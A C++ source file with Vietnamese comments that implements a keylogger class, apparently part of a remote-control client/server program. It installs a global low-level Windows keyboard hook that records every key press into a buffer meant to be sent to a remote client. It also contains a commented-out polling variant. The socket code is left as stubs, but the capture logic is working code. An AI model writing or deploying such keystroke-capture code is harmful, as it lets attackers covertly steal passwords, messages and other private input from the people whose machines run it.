#include "KLG_Obj.h"
#include "DataObj.h"
/*
std::string KLG_Obj::keylogger()
{
	std::string result = "";
	while (!checkStopSignal())
	{
		if (_kbhit())
		{
			char ch = _getch();
			result += ch;
		}
	}
	
	return result;
}
*/



LRESULT KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode < 0) { // Bỏ qua các thông điệp khác nếu nCode < 0
		return CallNextHookEx(NULL, nCode, wParam, lParam);
	}
	
	// Lấy thông tin về sự kiện phím
	KBDLLHOOKSTRUCT* pkbhs = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);

	if (wParam == WM_KEYDOWN)
	{
		// Nếu là sự kiện nhấn phím, lưu phím vào biến tạm
		keylog.push_back(pkbhs->vkCode);
	}

	// Gọi hàm xử lý sự kiện tiếp theo trong chuỗi xử lý
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

std::string KLG_Obj::keylogger()
{
	// Thiết lập hook để bắt sự kiện phím
	HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
	// Nếu không thiết lập hook thành công, báo lỗi và thoát chương trình
	if (!hook)
	{
		std::cout << "Error setting keyboard hook: " << GetLastError() << std::endl;
		
		// Đóng socket và giải phóng thư viện Winsock
		// ...

		return "Hook failed.";
	}

	while (!checkStopSignal())
	{
		// Nếu đã bắt được ít nhất một phím, gửi danh sách các phím đã bắt được đến client
		if (!keylog.empty())
		{
			// Ghép các phím đã bắt được thành một chuỗi
			for (auto key : keylog)
			{
				_data.push_back(char(key));
			}

			// Xóa danh sách các phím đã bắt được
			keylog.clear();
		}

		// Chờ 1 giây trước khi kiểm tra lại
		Sleep(1000);
	}

	// Huỷ hook
	UnhookWindowsHookEx(hook);
	
	// Đóng socket và giải phóng thư viện Winsock
	// ...

	return "Success";
}


bool KLG_Obj::checkStopSignal()
{
	DataObj stopSignal;

	// thao tác nhận tín hiệu từ client là đối tượng DataObj stopSignal
	// ...


	if (stopSignal.getFuncType() == KLG && stopSignal.getCmdType() == STOP)
	{
		// gửi thông điệp đã nhận được tín hiệu cho client 
		// ...
		//closesocket(ClientSocket);
		//closesocket(ListenSocket);
		//WSACleanup();
		return true;
	}
	return false;
}